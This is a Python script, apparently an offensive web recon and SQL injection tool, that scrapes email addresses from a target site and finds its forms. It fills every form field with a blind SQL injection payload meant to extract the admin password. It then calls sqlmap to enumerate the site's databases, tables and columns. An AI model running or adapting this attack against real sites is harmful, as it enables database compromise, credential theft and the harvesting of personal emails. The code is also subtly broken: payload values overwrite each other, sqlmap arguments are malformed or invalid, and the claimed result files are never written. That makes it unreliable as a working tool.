import requests
from bs4 import BeautifulSoup
import pyfiglet
from termcolor import colored
import re
import argparse
import os
import subprocess

print("python web_recon_sql_injection_improved.py https://target.com")


def banner():
    ascii_banner = pyfiglet.figlet_format("x4**p-scan")
    print(colored(ascii_banner, 'red'))
    print("by @hagg4r")

def parse_arguments():
    parser = argparse.ArgumentParser(description="Web Recon Scanner")
    parser.add_argument("target", help="Target website to scan")
    return parser.parse_args()

def find_emails(target):
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.text, 'html.parser')
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', soup.get_text())
        return list(set(emails))
    except Exception as e:
        print(colored(f"Error: {e}", 'red'))
        return []

def find_forms(target):
    forms = []
    try:
        response = requests.get(target)
        soup = BeautifulSoup(response.text, 'html.parser')
        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'GET').upper()
            inputs = [(input.get('name'), input.get('type')) for input in form.find_all('input') if input.get('name')]
            forms.append((action, method, inputs))
    except Exception as e:
        print(colored(f"Error: {e}", 'red'))
    return forms

def perform_boolean_sql_injection(target, form_data):
    sqlmap_command = [
        'sqlmap',
        '-u', f"{target}{form_data['action']}",
        '--data', f"{form_data['method'].lower()}:{', '.join([f'{name}={value}' for name, value in form_data.items() if name!= 'action' and name!= 'method'])}",
        '--dbs', '--tables', '--columns',
        '--random-agent',
        '--level', '1',
        '--risk', '1',
        '--batch',
        '--boolean-based',
        '--text-only',
    ]

    try:
        subprocess.run(sqlmap_command, check=True)
        print(colored("\n[] Boolean-based SQL Injection test completed. Results saved to desktop.", 'green'))
        return True
    except subprocess.CalledProcessError as e:
        print(colored(f"\n[] Boolean-based SQL Injection test failed: {e.output}", 'red'))
        return False

def main():
    banner()
    args = parse_arguments()
    target = args.target
    print(colored(f"\n[] Target: {target}", 'yellow'))

    print(colored("\n[] Found emails:", 'yellow'))
    emails = find_emails(target)
    if not emails:
        print(colored("  - None found.", 'yellow'))
    else:
        for email in emails:
            print(f"  - {email}")

    print(colored("\n[] Found potential forms for SQL Injection:", 'yellow'))
    forms = find_forms(target)
    if not forms:
        print(colored("  - None found.", 'yellow'))
    else:
        for form in forms:
            form_data = {
                'action': form[0],
                'method': form[1],
                **{name: f"' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), {i}, 1)) = {ord(c)}-- -" for i, c in enumerate('admin') for name, _ in form[2]}
            }
            results_file = f"{os.path.expanduser('~')}/Desktop/{os.path.basename(form[0])}.txt"
            perform_boolean_sql_injection(target, form_data)
            print(f"  - Action: {form[0]}, Method: {form[1]}, Inputs: {', '.join([name for name, _ in form[2]])}, Results saved to {results_file}")

if __name__ == "__main__":
    main()
